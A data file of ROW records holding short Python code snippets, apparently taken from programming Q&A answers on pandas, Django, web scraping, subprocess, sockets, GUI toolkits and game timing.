    ScoreA = (PowerRankA + WinPercA + LuckA) / 3
    ScoreB = (PowerRankB + WinPercB + LuckB + HomeBonus) / 3

    TeamAScore += ScoreA
    TeamBScore += ScoreB

    if ScoreA &gt; ScoreB:
        TeamAWins += 1
    elif ScoreA &lt; ScoreB:
        TeamBWins += 1
    else:
        NoWins += 1


TeamAScore /= 100.0
TeamBScore /= 100.0

print "Avg. Score for TeamA:", TeamAScore, " number of Wins:", TeamAWin
print "Avg. Score for TeamB:", TeamBScore, " number of Wins:", TeamBWin
print "No Wins:", NoWins
</snippet></ROW><ROW><id>20404514</id><snippet>list</snippet></ROW><ROW><id>20404514</id><snippet>.append()</snippet></ROW><ROW><id>20404514</id><snippet>TeamA_All_Scores = [] # list for all scores
TeamB_All_Scores = [] # list for all scores

TeamAWins = 0
TeamBWins = 0
NoWins = 0

for i in range(100):
    LuckA = random.randrange(0,25)
    LuckB = random.randrange(0,25)

    ScoreA = (PowerRankA + WinPercA + LuckA) / 3
    ScoreB = (PowerRankB + WinPercB + LuckB + HomeBonus) / 3

    TeamA_All_Scores.append(ScoreA)
    TeamB_All_Scores.append(ScoreB)

    if ScoreA &gt; ScoreB:
        TeamAWins += 1
    elif ScoreA &lt; ScoreB:
        TeamBWins += 1
    else:
        NoWins += 1


TeamAScore = sum(TeamA_All_Scores) / 100.0
TeamBScore = sum(TeamB_All_Scores) / 100.0

print "Avg. Score for TeamA:", TeamAScore, " number of Wins:", TeamAWin
print "Avg. Score for TeamB:", TeamBScore, " number of Wins:", TeamBWin
print "No Wins:", NoWins
print "TeamA All Scores:", ",".join(TeamA_All_Scores)
print "TeamB All Scores:", ",".join(TeamB_All_Scores)
</snippet></ROW><ROW><id>20404613</id><snippet>itertools.chain</snippet></ROW><ROW><id>20404613</id><snippet>import itertools

for match in itertools.chain(re.finditer(pattern_1, text), re.finditer(pattern_2, text)):
    pass
</snippet></ROW><ROW><id>20404658</id><snippet>&lt;span&gt;</snippet></ROW><ROW><id>20404658</id><snippet>.findAll()</snippet></ROW><ROW><id>20404658</id><snippet>html = response.read()
soup = BeautifulSoup(html, from_encoding=response.info().getparam('charset'))
for div in soup.findAll('div','zitat'):
    for span in div.findAll('span', 'quote_zeile'):
        print span.string
</snippet></ROW><ROW><id>20404658</id><snippet>&gt;&gt;&gt; for div in soup.findAll('div','zitat'):
...     for span in div.findAll('span', 'quote_zeile'):
...         print span.string
... 
&lt;bigg-el&gt; war grad schuhe kaufen

&lt;bigg-el&gt; konnte mich nicht entscheiden...

&lt;bigg-el&gt; dann hab ich halt beide genommen :D

&lt;Sputnik&gt; links UND rechts??
&lt;Busstard&gt; weisste was scheisse is?

&lt;Parteibruder&gt; Nöa!

&lt;Busstard&gt; wenn man seinen eigenen vadda um halb zehn im puff trifft....&gt;(

&lt;Parteibruder&gt; LOOOOOOL
&lt;Psyman2&gt; Saw? gib mal ne Zusammenfassung

&lt;Alf777&gt; Gewalt, Blut, Folter, psychische Schäden und abgetrennte Körperteile

&lt;Psyman2&gt; Aha, normale Hauptschule also

&lt;Alf777&gt; rofl
&lt;complex&gt; ich verhüte nicht. frauen hüten sich vor mir -.-
&lt;MeX&gt; Da steht im neuen Plus-Prospekt doch tatsächlich:

&lt;MeX&gt; Achtung: Silvesterknaller nur aus 2 Meter Entfernung entzünden!

&lt;MeX&gt; Wie stellen die sich das vor? Mit nem Flammenwerfer?
</snippet></ROW><ROW><id>20404658</id><snippet>BeautifulSoup</snippet></ROW><ROW><id>20404658</id><snippet>Content-Type</snippet></ROW><ROW><id>20404920</id><snippet>def my_function(f, value):
  yield value
  while True:
    value = f(value)
    yield value
</snippet></ROW><ROW><id>20405131</id><snippet>clr.ClearProfilerData() #unload the .dll file so the file lock is released
</snippet></ROW><ROW><id>20405472</id><snippet>/usr/local/lib/pythonX.Y/site-packages</snippet></ROW><ROW><id>20405472</id><snippet>userbase/lib/pythonX.Y/site-packages</snippet></ROW><ROW><id>20405472</id><snippet>$HOME/.local</snippet></ROW><ROW><id>20405472</id><snippet>$PREFIX/lib/python2.7/lib-dynload</snippet></ROW><ROW><id>20405472</id><snippet>$PREFIX/bin</snippet></ROW><ROW><id>20405472</id><snippet>setup.py</snippet></ROW><ROW><id>20405656</id><snippet>|</snippet></ROW><ROW><id>20405656</id><snippet>if (cts is None) or (len(cts) == 0):
    return
</snippet></ROW><ROW><id>20405780</id><snippet>x</snippet></ROW><ROW><id>20405780</id><snippet>y</snippet></ROW><ROW><id>20405780</id><snippet>direction</snippet></ROW><ROW><id>20405780</id><snippet>self</snippet></ROW><ROW><id>20405780</id><snippet>class Game():

    def __init__(self, x, y, direction):   
</snippet></ROW><ROW><id>20405780</id><snippet>Game().run()
</snippet></ROW><ROW><id>20405780</id><snippet>class Game():

    def __init__(self):   
</snippet></ROW><ROW><id>20405927</id><snippet>Operation Average Case Amortized Worst Case

Get Item  O(1)         O(n)

x in s    O(1)         O(n)  #From sets
</snippet></ROW><ROW><id>20406143</id><snippet>mongorestore</snippet></ROW><ROW><id>20406657</id><snippet>my_array[[],[]]=0
</snippet></ROW><ROW><id>20406657</id><snippet>my_array[:,:]=0
</snippet></ROW><ROW><id>20406662</id><snippet>from mymodule import func

def func(): # is this allowed?
    pass

func() # should this now fail?
</snippet></ROW><ROW><id>20406691</id><snippet>import cherrypy


def show_blank_page_on_error():
    """Instead of showing something useful to developers but
    disturbing to clients we will show a blank page.

    """
    cherrypy.response.status = 500

    cherrypy.response.body = ''


class Root():
    """Root of the application"""

    _cp_config = {'request.error_response': show_blank_page_on_error}

    @cherrypy.expose
    def index(self):
        """Root url handler"""

        raise Exception 
</snippet></ROW><ROW><id>20406752</id><snippet>foo</snippet></ROW><ROW><id>20406752</id><snippet>C</snippet></ROW><ROW><id>20406752</id><snippet>isinstance(foo, C)
</snippet></ROW><ROW><id>20406752</id><snippet>foo</snippet></ROW><ROW><id>20406752</id><snippet>C</snippet></ROW><ROW><id>20406752</id><snippet>C</snippet></ROW><ROW><id>20406752</id><snippet>type(foo) == C
</snippet></ROW><ROW><id>20406752</id><snippet>isinstance(...)</snippet></ROW><ROW><id>20406752</id><snippet>type(...)</snippet></ROW><ROW><id>20406758</id><snippet>__setattr__</snippet></ROW><ROW><id>20407022</id><snippet>F</snippet></ROW><ROW><id>20407022</id><snippet>output = [sum(data[char] for char in s) for s in C]
</snippet></ROW><ROW><id>20407022</id><snippet>[113, 129, 128, 114, 242, 257, 242, 227, 370, 371, 355, 356, 484]
</snippet></ROW><ROW><id>20407088</id><snippet>shell=True</snippet></ROW><ROW><id>20407088</id><snippet>subprocess.check_call(
 ['fpm', '-s', 'dir', '-t', 'rpm', '-n', 'name', '-v', 'rpmversion',
  '--prefix=/opt/', '--rpm-auto-add-directories', 'target'])
</snippet></ROW><ROW><id>20407088</id><snippet>shell=True</snippet></ROW><ROW><id>20407088</id><snippet>subprocess.check_call(
    'fpm -s dir -t rpm -n name -v rpmversion --prefix=/opt/ --rpm-auto-add-directories target', shell=True)
</snippet></ROW><ROW><id>20407103</id><snippet>x1</snippet></ROW><ROW><id>20407103</id><snippet>x2</snippet></ROW><ROW><id>20407103</id><snippet>&gt;&gt;&gt; df = pd.DataFrame({'x1': {0: np.nan, 1: 2.0, 2: 4.0, 3: 1, 4: 8.0}, 'x2': {0: 3.0, 1: 2.0, 2: 2.0, 3: 5.0, 4: np.nan}})
&gt;&gt;&gt; df
   x1  x2
0 NaN   3
1   2   2
2   4   2
3   1   5
4   8 NaN

[5 rows x 2 columns]
</snippet></ROW><ROW><id>20407103</id><snippet>x1</snippet></ROW><ROW><id>20407103</id><snippet>where</snippet></ROW><ROW><id>20407103</id><snippet>x1</snippet></ROW><ROW><id>20407103</id><snippet>x2</snippet></ROW><ROW><id>20407103</id><snippet>&gt;&gt;&gt; df["x1"].where(~pd.isnull(df["x1"]), df["x2"])
0    3
1    2
2    4
3    1
4    8
Name: x1, dtype: float64
</snippet></ROW><ROW><id>20407103</id><snippet>&gt;&gt;&gt; df[["x1", "x2"]].max(axis=1)
0    3
1    2
2    4
3    5
4    8
dtype: float64
</snippet></ROW><ROW><id>20407176</id><snippet>class User(Base):
    id = Column(Integer, primary_key=True)
    name = Column(Unicode(50), nullable=False, unique=True)


class Group(Base):
    id = Column(Integer, primary_key=True)
    name = Column(Unicode(50), nullable=False, unique=True)


class Membership(Base):
    user_id = Column(Integer, ForeignKey(User.id), primary_key=True)
    group_id = Column(Integer, ForeignKey(Group.id), primary_key=True)
    joined_on = Column(DateTime, nullable=False, default=datetime.utcnow, server_default=func.current_timestamp())

    user = relationship(User, backref=backref('memberships', collection_class=set))
    group = relationship(Group, backref=backref('memberships', collection_class=set))


User.groups = association_proxy('memberships', 'group')
Group.users = association_proxy('memberships', 'user')
</snippet></ROW><ROW><id>20407176</id><snippet>session.query(Membership.user_id).filter(Membership.group_id == 3, Membership.joined_on.between(previous, now)).count()
</snippet></ROW><ROW><id>20407360</id><snippet>[a for a in SearchList if a[:-7] in BaseList]
</snippet></ROW><ROW><id>20407363</id><snippet>home_team</snippet></ROW><ROW><id>20407380</id><snippet>b'\x5e\x2e\x6d'</snippet></ROW><ROW><id>20407380</id><snippet>b'^.m'</snippet></ROW><ROW><id>20407380</id><snippet>&gt;&gt;&gt; x = b'\x5e\x2e\x6d'
&gt;&gt;&gt; print(''.join(map(r'\x{:x}'.format, bytearray(x))))
\x5e\x2e\x6d
</snippet></ROW><ROW><id>20407380</id><snippet>&gt;&gt;&gt; print(''.join([r'\x{:x}'.format(c) for c in x]))
\x5e\x2e\x6d
</snippet></ROW><ROW><id>20407380</id><snippet>&gt;&gt;&gt; print(''.join([r'\x{:x}'.format(ord(c)) for c in x]))
\x5e\x2e\x6d
</snippet></ROW><ROW><id>20407465</id><snippet>.run()</snippet></ROW><ROW><id>20407465</id><snippet>thread.start()</snippet></ROW><ROW><id>20407465</id><snippet>from Queue import Queue
from threading import Thread

def is_ssh_up(result_queue, hostname, port=22):
    # try to connect here
    # ...
    # write results
    result_queue.put((hostname, True)) # Up

def main():
    q = Queue()
    hosts = ["host1", "host2", "google.com", "host3"]

    for hostname in hosts: # start worker threads
        t = Thread(target=is_ssh_up, args=[q, hostname])
        t.daemon = True
        t.start()

    for _ in hosts: # collect results
        hostname, is_up = q.get()
        print("%s is %s" % (hostname, "Up" if is_up else "Down"))
</snippet></ROW><ROW><id>20407465</id><snippet>from multiprocessing.pool import ThreadPool

def is_ssh_up(hostname, port=22):
    # try to connect here
    # ...
    # return results
    return hostname, is_up

hosts = ["host1", "host2", "google.com", "host3"]
pool = ThreadPool(20) # limit number of concurrent connections to 20
for hostname, is_up in pool.imap_unordered(is_ssh_up, hosts):
    status = "Up" if is_up else "Down" if is_up is not None else "Unknown"
    print("%s status is %s" % (hostname, status))
</snippet></ROW><ROW><id>20407500</id><snippet>B.txt</snippet></ROW><ROW><id>20407500</id><snippet>with open("B.txt") as file:
    B = dict(line.strip().split() for line in file)
</snippet></ROW><ROW><id>20407500</id><snippet>A.txt</snippet></ROW><ROW><id>20407500</id><snippet>C.txt</snippet></ROW><ROW><id>20407500</id><snippet>with open("A.txt") as infile, open("C.txt", "w") as outfile:
    for line in infile:
        start, end = line.strip().rsplit(None, 1)
        outfile.write("{0} {1}\n".format(start, B[end]))
</snippet></ROW><ROW><id>20407858</id><snippet>import urllib, urllib2


def basic_authorization(user, password):
    s = user + ":" + password
    return "Basic " + s.encode("base64").rstrip()

url = "https://api.sandbox.paypal.com/v1/oauth2/token"
params = { "grant_type": client_credentials}
data = urllib.urlencode(params)

req = urllib2.Request(url, data)
req.add_header("Authorization",basic_authorization("XXX"))
req.add_header("Accept", "application/json")
req.add_header("User-Agent", "my-python-app/1")

response = urllib2.urlopen(req)
</snippet></ROW><ROW><id>20407877</id><snippet>def OnShowPopup(self, event):
   """ Obtain right-click selection """
   pos = event.GetPosition()
   pos = self.panel.ScreenToClient(pos)
   self.rightClickSelected = event.GetEventObject()
   self.panel.PopupMenu(self.rightClickMenu, pos)

def OnPaste(self, event = None):
   """ Paste content from clipboard """
   self.rightClickSelected.SetFocus()
   if isinstance(self.rightClickSelected, wx.TextCtrl):
      self.rightClickSelected.Paste()
</snippet></ROW><ROW><id>20408203</id><snippet>&gt;&gt;&gt; s = """\
... First Line
... Second Line
... Third Line
... """
&gt;&gt;&gt; ba = QtCore.QByteArray(s.encode('utf-8'))
&gt;&gt;&gt; ts = QtCore.QTextStream(ba)
&gt;&gt;&gt; ts.setCodec('utf-8')
&gt;&gt;&gt; ts.readLine()
'First Line'
</snippet></ROW><ROW><id>20408356</id><snippet>class Answer(models.Model):
    answer_title = models.TextField(...)
    question = models.ForeignKey(Question, related_name='answer_set')

    class Meta:
        abstract = True

    objects = InheritanceManager()
</snippet></ROW><ROW><id>20408356</id><snippet>question.answer_set.all()</snippet></ROW><ROW><id>20408544</id><snippet>def handle(self):
    while 1:
        self.data = self.request.recv(1024).strip()
        print self.data
        if self.data == 'quit':
            break
        # echo back data in all caps
        self.request.sendall(self.data.upper())
</snippet></ROW><ROW><id>20408831</id><snippet>Popen()</snippet></ROW><ROW><id>20408831</id><snippet>#!/usr/bin/env python
import logging
import subprocess

# log to a file in case `ldapadder` corrupts terminal
logging.basicConfig(format="%(asctime)-15s %(message)s", datefmt="%F %T",
                    filename='logfile', level=logging.DEBUG)
p = logging.getLogger(__name__).info

p("before ldapadder")
try:
    proc = subprocess.Popen(["ldapadder", filename], close_fds=True)
    p("after Popen")
    proc.wait()
    p("after wait")
finally:
    p("after ldappedder")
</snippet></ROW><ROW><id>20408831</id><snippet>$ python2.6 the_script.py
</snippet></ROW><ROW><id>20408831</id><snippet>logfile</snippet></ROW><ROW><id>20408831</id><snippet>the_script.py</snippet></ROW><ROW><id>20408872</id><snippet>match.group(0)</snippet></ROW><ROW><id>20408872</id><snippet>&gt;&gt;&gt; import re
&gt;&gt;&gt; s = "i got away with it, heeehe"
&gt;&gt;&gt; match = re.search("he*he", s)
&gt;&gt;&gt; match.group(0)
'heeehe'
</snippet></ROW><ROW><id>20408872</id><snippet>0</snippet></ROW><ROW><id>20408960</id><snippet>or</snippet></ROW><ROW><id>20408960</id><snippet>player != r or p or s
</snippet></ROW><ROW><id>20408960</id><snippet>player not in (r, p, s)
</snippet></ROW><ROW><id>20408960</id><snippet>A or B</snippet></ROW><ROW><id>20408960</id><snippet>A</snippet></ROW><ROW><id>20408960</id><snippet>A</snippet></ROW><ROW><id>20408960</id><snippet>A</snippet></ROW><ROW><id>20408960</id><snippet>False</snippet></ROW><ROW><id>20408960</id><snippet>0</snippet></ROW><ROW><id>20408960</id><snippet>0.0</snippet></ROW><ROW><id>20408960</id><snippet>[]</snippet></ROW><ROW><id>20408960</id><snippet>''</snippet></ROW><ROW><id>20408960</id><snippet>A or B</snippet></ROW><ROW><id>20408960</id><snippet>B</snippet></ROW><ROW><id>20408960</id><snippet>player != r or p or s</snippet></ROW><ROW><id>20408960</id><snippet>(player != r) or p or s</snippet></ROW><ROW><id>20408960</id><snippet>(player != r) or p or s</snippet></ROW><ROW><id>20408960</id><snippet>True</snippet></ROW><ROW><id>20408960</id><snippet>player != r</snippet></ROW><ROW><id>20408960</id><snippet>p</snippet></ROW><ROW><id>20408960</id><snippet>True</snippet></ROW><ROW><id>20408960</id><snippet>p</snippet></ROW><ROW><id>20408960</id><snippet>if player != r or p or s:
if True:
</snippet></ROW><ROW><id>20408986</id><snippet>EVENT\s[\w'-]+\s[0-9]+
</snippet></ROW><ROW><id>20409096</id><snippet>photos = UploadSet('photos', IMAGES)

@app.route('/upload', methods=['GET', 'POST'])
def upload():
    if request.method == 'POST' and 'photo' in request.files:
        filename = photos.save(request.files['photo'])
        rec = Photo(filename=filename, user=g.user.id)
        rec.store()
        flash("Photo saved.")
        return redirect(url_for('show', id=rec.id))
    return render_template('upload.html')

@app.route('/photo/&lt;id&gt;')
def show(id):
    photo = Photo.load(id)
    if photo is None:
        abort(404)
    url = photos.url(photo.filename)
    return render_template('show.html', url=url, photo=photo)
</snippet></ROW><ROW><id>20409306</id><snippet>&gt;&gt;&gt; out[9]
[array([ 0.,  0.,  2.,  2.,  2.])]
&gt;&gt;&gt; out[9][0]
array([ 0.,  0.,  2.,  2.,  2.])
&gt;&gt;&gt; out[9][0][-1]
2.0
</snippet></ROW><ROW><id>20409306</id><snippet>&gt;&gt;&gt; out[9][0][-1] *= 100
&gt;&gt;&gt; out[9][0][-1]
200.0
&gt;&gt;&gt; out[9]
[array([   0.,    0.,    2.,    2.,  200.])]
</snippet></ROW><ROW><id>20409353</id><snippet>.py</snippet></ROW><ROW><id>20409353</id><snippet>.py</snippet></ROW><ROW><id>20409353</id><snippet>Open with</snippet></ROW><ROW><id>20409353</id><snippet>Choose default program...</snippet></ROW><ROW><id>20409353</id><snippet>Browse...</snippet></ROW><ROW><id>20409353</id><snippet>C:\Python33\python3.3.exe</snippet></ROW><ROW><id>20409353</id><snippet>Open</snippet></ROW><ROW><id>20409353</id><snippet>.py</snippet></ROW><ROW><id>20409451</id><snippet>SequenceMatcher(None, str(m.ITEM_NAME_x), str(m.ITEM_NAME_y)).ratio()</snippet></ROW><ROW><id>20409451</id><snippet>import difflib
from functools import partial
import pandas as pd

def apply_sm(s, c1, c2): 
    return difflib.SequenceMatcher(None, s[c1], s[c2]).ratio()

df = pd.DataFrame({'A': {1: 'one'}, 'B': {1: 'two'}})
print df.apply(partial(apply_sm, c1='A', c2='B'), axis=1)
</snippet></ROW><ROW><id>20409451</id><snippet>1    0.333333
dtype: float64
</snippet></ROW><ROW><id>20409491</id><snippet>PyQt4</snippet></ROW><ROW><id>20409491</id><snippet>PyQt5</snippet></ROW><ROW><id>20409491</id><snippet>from PyQt4 import QtGui
from mainWindowUi import Ui_MainWindow #same name as appears in mainWindowUi.py

class MainWindow (QtGui.QMainWindow): #Or wherever you are inheriting from
    def __init__ (self, parent = None):
        super (MainWindow, self).__init__ ()
        self.ui = Ui_MainWindow () #same name as appears in mainWindowUi.py
        self.ui.setupUi (self)

    #implement slots and signals and other funny things
</snippet></ROW><ROW><id>20409491</id><snippet>#! /usr/bin/python3.3

import sys
from PyQt4 import QtGui
from mainWindow import MainWindow

def main():
    app = QtGui.QApplication (sys.argv)
    m = MainWindow ()
    m.show ()
    sys.exit (app.exec_ () )


if __name__ == '__main__':
    main ()
</snippet></ROW><ROW><id>20409491</id><snippet>program.py</snippet></ROW><ROW><id>20409531</id><snippet>&gt;&gt;&gt; df['x'] = (df["x1"]==df["x2"]).astype(int)
&gt;&gt;&gt; df
   x1  x2  x
0 NaN   3  0
1   2   2  1
2   4   2  0
3   1   5  0
4   8 NaN  0
</snippet></ROW><ROW><id>20409662</id><snippet>reverse('url-name')</snippet></ROW><ROW><id>20410037</id><snippet>import httpagentparser
</snippet></ROW><ROW><id>20410037</id><snippet>def detectBrowser(request):
agent = request.environ.get('HTTP_USER_AGENT')
browser = httpagentparser.detect(agent)
if not browser:
    browser = agent.split('/')[0]
else:
    browser = browser['browser']['name']  

return browser
</snippet></ROW><ROW><id>20410098</id><snippet>prop1 thing
prop2 stuff
prop3 junk
prop1 something
prop2 whatever
</snippet></ROW><ROW><id>20410098</id><snippet>from collections import defaultdict
d = defaultdict(list)

with open('infile') as f:
    for line in f:
        k,v = line.strip().split()
        d[k].append(v)
</snippet></ROW><ROW><id>20410098</id><snippet>for k,v in sorted(d.items()):
    print('{}: {}'.format(k,'+'.join(v)))

prop1: thing+something
prop2: stuff+whatever
prop3: junk
</snippet></ROW><ROW><id>20410098</id><snippet>print</snippet></ROW><ROW><id>20410134</id><snippet>fig, ax = plt.subplots(1)
ax.hist(data)

vmin = data.min().min()
vmax = data.max().max()
data_range = vmax - vmin
scale_factor = 0.1
xmin = vmin - scale_factor*vmax
xmax = vmax + scale_factor*vmax
ax.set_xlim(xmin, xmax)
</snippet></ROW><ROW><id>20410313</id><snippet>class MySerializer(serializers.ModelSerializer):
    proposal_side = serializers.SlugRelatedField(many=False, read_only=False, slug_field='proposal_side')
    my_proposal_type = serializers.SlugRelatedField(many=False, read_only=False, slug_field='proposal_type')
    my_proposal_delivery_type = serializers.SlugRelatedField(many=False, read_only=False, slug_field='delivery_type')
    my_survey_method = serializers.SlugRelatedField(many=False, read_only=False, slug_field='method')
    class Meta:
        model = diliModels.Proposal
        fields = (
            'id'
            ,'my_proposal_side'
            ,'my_proposal_type'
            ,'number_of_participants'
            ,'cost_per_participants'
            ,'minimum_dollar_commitment'
            ,'commercial_terms'
            ,'is_publicly_visible'
            ,'is_anonymous'
            ,'is_republish'
            ,'name'
            ,'my_delivery_type'
            ,'my_survey_method'
            ,'number_of_unique_contacts'
            ,'availability_start'
            ,'availability_end'
            ,'location_country'
            ,'location_city'
            ,'location_state'
            ,'description'
            ,'desired_meetings'
        )

        def validate(self, attrs):
             raise serializers.ValidationError("error")
             return attrs
</snippet></ROW><ROW><id>20410561</id><snippet>str()</snippet></ROW><ROW><id>20410561</id><snippet>&gt;&gt;&gt; pkt_str = str(pkt)
&gt;&gt;&gt; pkt_str
'\x00PV\xfc\xceP\x00\x0c)+S\x19\x08\x00E\x00\x00T\x00\x00@\x00@\x01Z|\xc0\xa8
\x19\x82\x04\x02\x02\x01\x08\x00\x9c\x90Za\x00\x01\xe6\xdapI\xb6\xe5\x08\x00
\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b
\x1c\x1d\x1e\x1f !"#$%&amp;\'()*+,-./01234567'
</snippet></ROW><ROW><id>20410723</id><snippet>python keep_backend/manage.py runserver</snippet></ROW><ROW><id>20410723</id><snippet>PYTHONPATH</snippet></ROW><ROW><id>20410723</id><snippet>keep_backend</snippet></ROW><ROW><id>20410723</id><snippet>credentials.py</snippet></ROW><ROW><id>20410723</id><snippet>PYTHONPATH</snippet></ROW><ROW><id>20410723</id><snippet>PYTHONPATH=`pwd`:$PYTHONPATH python keep_backend/manage.py runserver
</snippet></ROW><ROW><id>20410775</id><snippet>project_name = raw_input("Please give the name of your project.\n")
</snippet></ROW><ROW><id>20410924</id><snippet>plugins\PythonScript\lib</snippet></ROW><ROW><id>20410924</id><snippet>C:\Program Files\Notepad++\plugins\PythonScript\lib</snippet></ROW><ROW><id>20410924</id><snippet>C:\Program Files (x86)\Notepad++\plugins\PythonScript\lib</snippet></ROW><ROW><id>20410962</id><snippet>__setattr__(self, name, value)</snippet></ROW><ROW><id>20410962</id><snippet>__setattr__</snippet></ROW><ROW><id>20410962</id><snippet>Gun</snippet></ROW><ROW><id>20410962</id><snippet>TimeTravelBase</snippet></ROW><ROW><id>20410962</id><snippet>Gun</snippet></ROW><ROW><id>20410962</id><snippet>color</snippet></ROW><ROW><id>20410962</id><snippet>shots_fired</snippet></ROW><ROW><id>20410962</id><snippet>Gun</snippet></ROW><ROW><id>20410962</id><snippet>import time

class TimeTravelBase(object):
    def __init__(self):
        self.history = []
        self.blacklist = ['blacklist']

    def __setattr__(self, name, value):
        super(TimeTravelBase, self).__setattr__(name, value)
        if hasattr(self, 'blacklist') and name not in self.blacklist:
            self.history.append({'time': time.time(), 'name': name, 'value': value})

class Gun(TimeTravelBase):
    def __init__(self):
        super(Gun, self).__init__()
        self.blacklist.append('color')
        self.shots_fired = 0
        self.color = "black"

    def fire(self):
        self.shots_fired += 1

if __name__=='__main__':
    gun = Gun()
    gun.color = "red"
    gun.fire()
    from pprint import pprint
    pprint(gun.history)
</snippet></ROW><ROW><id>20410962</id><snippet>[{'name': 'shots_fired', 'time': 1386281320.322638, 'value': 0},
 {'name': 'shots_fired', 'time': 1386281320.322645, 'value': 1}]
</snippet></ROW><ROW><id>20410998</id><snippet>&gt;&gt;&gt; "abc"[-1]
'c'
&gt;&gt;&gt; [2, 3, 42][-1]
42
</snippet></ROW><ROW><id>20410998</id><snippet>find()</snippet></ROW><ROW><id>20410998</id><snippet>find()</snippet></ROW><ROW><id>20410998</id><snippet>index()</snippet></ROW><ROW><id>20410998</id><snippet>try/except</snippet></ROW><ROW><id>20410998</id><snippet>string.find()</snippet></ROW><ROW><id>20410998</id><snippet>string.index()</snippet></ROW><ROW><id>20411063</id><snippet>__all__</snippet></ROW><ROW><id>20411211</id><snippet>Http</snippet></ROW><ROW><id>20411211</id><snippet>import httplib2

http = httplib2.Http()
http.follow_redirects = False
</snippet></ROW><ROW><id>20411220</id><snippet>@login_manager.user_loader
def load_user(userid):
    # Return the user ID here.
</snippet></ROW><ROW><id>20411220</id><snippet>@login_manager.user_loader
def load_user(userid):
    return User()
</snippet></ROW><ROW><id>20411220</id><snippet>User</snippet></ROW><ROW><id>20411263</id><snippet>dirEntries(dir_name)</snippet></ROW><ROW><id>20411263</id><snippet>None</snippet></ROW><ROW><id>20411263</id><snippet>def dirEntries(dir_name):
    ''' Creates a list of all files in the folder 'dir_name' which we assign when we call the function later'''

    fileList = []
    '''creates an empty list'''
    for file in os.listdir(dir_name):
        '''for all files in the directory given'''
        dirfile = os.path.join(dir_name, file)
        '''creates a full file name including path for each file in the directory'''
        if os.path.isfile(dirfile) and os.path.splitext(dirfile)[1][1:]!='lock':
            '''if the full file name above is a file and it does not end in 'lock' it will be added to the list created above'''
            fileList.append(dirfile)
    return fileList
</snippet></ROW><ROW><id>20411272</id><snippet>mayavi</snippet></ROW><ROW><id>20411336</id><snippet>HourFormSet = modelformset_factory(Hour, extra=5, exclude=('user',))
</snippet></ROW><ROW><id>20411336</id><snippet>if request.method == 'POST':
    formset = HourFormSet(request.POST)

    if formset.is_valid():
        instances = formset.save(commit=False)  # This will return unsaved Hour objects
        for instance in instances:
            instance.user = request.user        # Add the logged in user
            instance.save()
        return index(request)

formset = HourFormSet(queryset=Hour.objects.none())
context_dict = {'formset': formset}
return render_to_response('add_hours.html', context_dict, context)
</snippet></ROW><ROW><id>20411342</id><snippet>command</snippet></ROW><ROW><id>20411342</id><snippet>None</snippet></ROW><ROW><id>20411342</id><snippet>b = Button(master, text="Power On", command=callback_power_on(on,host, port))</snippet></ROW><ROW><id>20411342</id><snippet>b = Button(master, text="Power On", command=callback_power_on)
</snippet></ROW><ROW><id>20411342</id><snippet>b = Button(master, text="Power On", command= lambda: callback_power_on(on,host, port))
</snippet></ROW><ROW><id>20411342</id><snippet>command</snippet></ROW><ROW><id>20411342</id><snippet>functools.partial</snippet></ROW><ROW><id>20411491</id><snippet>find_element_by_link_text</snippet></ROW><ROW><id>20411491</id><snippet>findHeaderLearn = driver.find_element_by_css_selector("#nav-global a[href*='learn']")
</snippet></ROW><ROW><id>20411491</id><snippet>findHeaderLearn = driver.find_element_by_xpath(".//*[@id='nav-global']//a[contains(@href, 'learn')]")
# findHeaderLearn = driver.find_element_by_xpath(".//*[@id='nav-global']//a[text()='Learn']")
</snippet></ROW><ROW><id>20411707</id><snippet>treeCtrl.Unbind(wx.EVT_KEY_DOWN)</snippet></ROW><ROW><id>20411922</id><snippet>#!/usr/bin/python

from socket import *
#import re

HOST = 'localhost'  # server IP
PORT = 21567        # port
BUFSIZ = 1024
ADDR = (HOST, PORT)
#ip = re.compile(r'([0-9\.]{1,3}){4}')


def validate_ip(ip):
    try:
        if inet_aton(ip):
           return True
    except:
        return False

def query():
    while True:
        hostc = raw_input('Host: ')
        portc = raw_input('Port: ')
        if (portc and validate_ip(hostc)):
            try:
                tcpCliSock.connect(hostc, int(portc))
                break
            except:
                pass
            #print("\nInvalid Entry.\n")
        else:
            tcpCliSock.connect(ADDR)
            break

tcpCliSock = socket(AF_INET, SOCK_STREAM)   # allocate client's socket
query()
</snippet></ROW><ROW><id>20412060</id><snippet>do_something</snippet></ROW><ROW><id>20412060</id><snippet>def do_something():
 print "starting"
 root.config(cursor="wait")
 root.update()
 time.sleep(5)
 root.config(cursor="")
 print "done"
</snippet></ROW><ROW><id>20412060</id><snippet>window</snippet></ROW><ROW><id>20412060</id><snippet>root</snippet></ROW><ROW><id>20412060</id><snippet>window</snippet></ROW><ROW><id>20412060</id><snippet>root</snippet></ROW><ROW><id>20412060</id><snippet>root.update()</snippet></ROW><ROW><id>20412060</id><snippet>return</snippet></ROW><ROW><id>20412068</id><snippet>scrapy crawl jin</snippet></ROW><ROW><id>20412078</id><snippet>player.update()</snippet></ROW><ROW><id>20412078</id><snippet>pygame.time.get_ticks() == 0
</snippet></ROW><ROW><id>20412078</id><snippet># __init__()

    self.time_to_change_alivetime = pygame.time.get_ticks() + self.second

# update()

    if pygame.time.get_ticks() &gt;= self.time_to_change_alivetime:
        self.alivetime += 1
        self.time_to_change_alivetime += self.second
</snippet></ROW><ROW><id>20412078</id><snippet>if</snippet></ROW><ROW><id>20412078</id><snippet># __init__()

    self.start_alivetime = pygame.time.get_ticks()

# update()

    self.alivetime = (pygame.time.get_ticks() - self.start_alivetime) / self.second
</snippet></ROW><ROW><id>20412078</id><snippet># __init__()

    self.start_alivetime = pygame.time.get_ticks()

# update()

    milliseconds = pygame.time.get_ticks() - self.start_alivetime

    self.alivetime_minutes = milliseconds / 60000 
    self.alivetime_seconds = (milliseconds % 60000) / self.second
    self.alivetime_milliseconds = milliseconds % self.second
</snippet></ROW><ROW><id>20412278</id><snippet>enscript</snippet></ROW><ROW><id>20412278</id><snippet>enscript  -E -q -Z -p - -f Courier10 readmaya.py | ps2pdf - out.pdf
</snippet></ROW><ROW><id>20412278</id><snippet>enscript</snippet></ROW><ROW><id>20412278</id><snippet>ps2pdf</snippet></ROW><ROW><id>20412311</id><snippet>string = json.loads(f.read())
tempString = string
